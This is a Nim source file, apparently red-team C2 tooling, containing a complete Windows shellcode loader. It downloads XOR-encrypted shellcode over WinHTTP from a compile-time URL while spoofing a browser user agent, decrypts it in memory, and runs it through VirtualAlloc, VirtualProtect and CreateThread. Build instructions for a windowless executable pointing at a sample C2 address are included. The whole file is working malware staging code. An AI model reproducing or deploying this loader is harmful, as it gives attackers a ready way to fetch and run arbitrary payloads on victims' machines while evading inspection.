## REDTEAM C2 — Nim WinHTTP shellcode loader
## Downloads XOR-encrypted shellcode, decrypts in-memory, executes via CreateThread.
##
## Compile-time constants (required):
##   -d:payloadUrl=https://host/path.bin
##   -d:xorKey=deadbeef...   (hex string, e.g. 16-byte key = 32 hex chars)
##
## Build:
##   nim c -d:mingw -d:strip -d:danger --opt:size \
##         -d:payloadUrl="https://10.0.0.1:8443/sc.bin" \
##         -d:xorKey="aabbccdd11223344" \
##         --app:gui -o:loader_nim.exe loader.nim

import strutils

# ── Compile-time constants ────────────────────────────────────────────────────

const PayloadUrl* {.strdefine.} = ""
const XorKey*     {.strdefine.} = ""

static:
  when PayloadUrl == "":
    {.error: "payloadUrl must be set via -d:payloadUrl=...".}
  when XorKey == "":
    {.error: "xorKey must be set via -d:xorKey=...".}

# ── Windows type / constant definitions ──────────────────────────────────────

type
  HANDLE    = int
  DWORD     = uint32
  BOOL      = int32
  LPVOID    = pointer
  LPCVOID   = pointer
  LPCWSTR   = ptr uint16
  LPCSTR    = cstring
  ULONG_PTR = uint

  HINTERNET = HANDLE

const
  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*    = DWORD(0)
  WINHTTP_FLAG_SECURE*                  = DWORD(0x00800000)
  WINHTTP_ADDREQ_FLAG_ADD*              = DWORD(0x20000000)

  MEM_COMMIT*   = DWORD(0x1000)
  MEM_RESERVE*  = DWORD(0x2000)
  PAGE_READWRITE*       = DWORD(0x04)
  PAGE_EXECUTE_READ*    = DWORD(0x20)
  INFINITE*             = DWORD(0xFFFFFFFF)

# ── WinHTTP imports (dynlib) ──────────────────────────────────────────────────

proc WinHttpOpen(
  pszAgentW:       LPCWSTR,
  dwAccessType:    DWORD,
  pszProxyW:       LPCWSTR,
  pszProxyBypassW: LPCWSTR,
  dwFlags:         DWORD
): HINTERNET {.importc: "WinHttpOpen", dynlib: "winhttp.dll", stdcall.}

proc WinHttpConnect(
  hSession:        HINTERNET,
  pswzServerName:  LPCWSTR,
  nServerPort:     uint16,
  dwReserved:      DWORD
): HINTERNET {.importc: "WinHttpConnect", dynlib: "winhttp.dll", stdcall.}

proc WinHttpOpenRequest(
  hConnect:        HINTERNET,
  pwszVerb:        LPCWSTR,
  pwszObjectName:  LPCWSTR,
  pwszVersion:     LPCWSTR,
  pwszReferrer:    LPCWSTR,
  ppwszAcceptTypes: ptr LPCWSTR,
  dwFlags:         DWORD
): HINTERNET {.importc: "WinHttpOpenRequest", dynlib: "winhttp.dll", stdcall.}

proc WinHttpSendRequest(
  hRequest:        HINTERNET,
  lpszHeaders:     LPCWSTR,
  dwHeadersLength: DWORD,
  lpOptional:      LPVOID,
  dwOptionalLength: DWORD,
  dwTotalLength:   DWORD,
  dwContext:       ULONG_PTR
): BOOL {.importc: "WinHttpSendRequest", dynlib: "winhttp.dll", stdcall.}

proc WinHttpReceiveResponse(
  hRequest: HINTERNET,
  lpReserved: LPVOID
): BOOL {.importc: "WinHttpReceiveResponse", dynlib: "winhttp.dll", stdcall.}

proc WinHttpReadData(
  hRequest:        HINTERNET,
  lpBuffer:        LPVOID,
  dwNumberOfBytesToRead: DWORD,
  lpdwNumberOfBytesRead: ptr DWORD
): BOOL {.importc: "WinHttpReadData", dynlib: "winhttp.dll", stdcall.}

proc WinHttpCloseHandle(
  hInternet: HINTERNET
): BOOL {.importc: "WinHttpCloseHandle", dynlib: "winhttp.dll", stdcall.}

# ── kernel32 imports ──────────────────────────────────────────────────────────

proc VirtualAlloc(
  lpAddress:        LPVOID,
  dwSize:           uint,
  flAllocationType: DWORD,
  flProtect:        DWORD
): LPVOID {.importc: "VirtualAlloc", dynlib: "kernel32.dll", stdcall.}

proc VirtualProtect(
  lpAddress:      LPVOID,
  dwSize:         uint,
  flNewProtect:   DWORD,
  lpflOldProtect: ptr DWORD
): BOOL {.importc: "VirtualProtect", dynlib: "kernel32.dll", stdcall.}

proc CreateThread(
  lpThreadAttributes: pointer,
  dwStackSize:        uint,
  lpStartAddress:     LPVOID,
  lpParameter:        LPVOID,
  dwCreationFlags:    DWORD,
  lpThreadId:         ptr DWORD
): HANDLE {.importc: "CreateThread", dynlib: "kernel32.dll", stdcall.}

proc WaitForSingleObject(
  hHandle:        HANDLE,
  dwMilliseconds: DWORD
): DWORD {.importc: "WaitForSingleObject", dynlib: "kernel32.dll", stdcall.}

# ── URL parsing helper ────────────────────────────────────────────────────────

type ParsedUrl = object
  scheme: string
  host:   string
  port:   uint16
  path:   string

proc parseUrl(raw: string): ParsedUrl =
  var s = raw
  result.scheme = "http"
  result.port = 80
  result.path = "/"

  if s.startsWith("https://"):
    result.scheme = "https"
    result.port = 443
    s = s[8..^1]
  elif s.startsWith("http://"):
    s = s[7..^1]

  # split host[:port] from path
  let slashIdx = s.find('/')
  var hostPart: string
  if slashIdx < 0:
    hostPart = s
    result.path = "/"
  else:
    hostPart = s[0..slashIdx-1]
    result.path = s[slashIdx..^1]

  # split host:port
  let colonIdx = hostPart.rfind(':')
  if colonIdx > 0:
    result.host = hostPart[0..colonIdx-1]
    try:
      result.port = uint16(parseInt(hostPart[colonIdx+1..^1]))
    except:
      discard
  else:
    result.host = hostPart

# ── Hex decode helper ─────────────────────────────────────────────────────────

proc fromHex(s: string): seq[byte] =
  let n = s.len div 2
  result = newSeq[byte](n)
  for i in 0..<n:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

# ── Wide string helper ────────────────────────────────────────────────────────

proc toWide(s: string): seq[uint16] =
  ## Convert ASCII/UTF-8 string to null-terminated UTF-16LE seq.
  result = newSeq[uint16](s.len + 1)
  for i, c in s:
    result[i] = uint16(ord(c))
  result[s.len] = 0

template wptr(ws: seq[uint16]): LPCWSTR =
  cast[LPCWSTR](unsafeAddr ws[0])

# ── Download via WinHTTP ──────────────────────────────────────────────────────

proc downloadShellcode(url: string): seq[byte] =
  let parsed = parseUrl(url)

  let wAgent  = toWide("Mozilla/5.0")
  let wHost   = toWide(parsed.host)
  let wVerb   = toWide("GET")
  let wPath   = toWide(parsed.path)
  let wEmpty  = toWide("")

  let isHttps = parsed.scheme == "https"

  let hSession = WinHttpOpen(
    wptr(wAgent),
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    nil, nil, 0
  )
  if hSession == 0: return @[]
  defer: discard WinHttpCloseHandle(hSession)

  let hConnect = WinHttpConnect(hSession, wptr(wHost), parsed.port, 0)
  if hConnect == 0: return @[]
  defer: discard WinHttpCloseHandle(hConnect)

  let reqFlags = if isHttps: WINHTTP_FLAG_SECURE else: DWORD(0)
  let hRequest = WinHttpOpenRequest(
    hConnect, wptr(wVerb), wptr(wPath),
    nil, nil, nil, reqFlags
  )
  if hRequest == 0: return @[]
  defer: discard WinHttpCloseHandle(hRequest)

  if WinHttpSendRequest(hRequest, nil, 0, nil, 0, 0, 0) == 0: return @[]
  if WinHttpReceiveResponse(hRequest, nil) == 0: return @[]

  # Read response body in 64 KB chunks
  const chunkSize = 65536
  var buf = newSeq[byte](chunkSize)
  while true:
    var bytesRead: DWORD = 0
    if WinHttpReadData(hRequest, addr buf[0], chunkSize, addr bytesRead) == 0:
      break
    if bytesRead == 0:
      break
    result.add(buf[0..bytesRead-1])

# ── XOR decrypt ──────────────────────────────────────────────────────────────

proc xorDecrypt(data: var seq[byte]; key: seq[byte]) =
  let klen = key.len
  if klen == 0: return
  for i in 0..<data.len:
    data[i] = data[i] xor key[i mod klen]

# ── Execute shellcode in-process ──────────────────────────────────────────────

proc execShellcode(sc: seq[byte]) =
  if sc.len == 0: return

  # Allocate RW memory
  let mem = VirtualAlloc(nil, uint(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return

  # Copy shellcode
  copyMem(mem, unsafeAddr sc[0], sc.len)

  # Flip to RX
  var oldProt: DWORD
  discard VirtualProtect(mem, uint(sc.len), PAGE_EXECUTE_READ, addr oldProt)

  # Create thread and wait
  var tid: DWORD
  let hThread = CreateThread(nil, 0, mem, nil, 0, addr tid)
  if hThread == 0: return
  discard WaitForSingleObject(hThread, INFINITE)

# ── Entry point ───────────────────────────────────────────────────────────────

proc main() =
  var sc = downloadShellcode(PayloadUrl)
  if sc.len == 0: return

  let key = fromHex(XorKey)
  xorDecrypt(sc, key)

  execShellcode(sc)

when isMainModule:
  main()
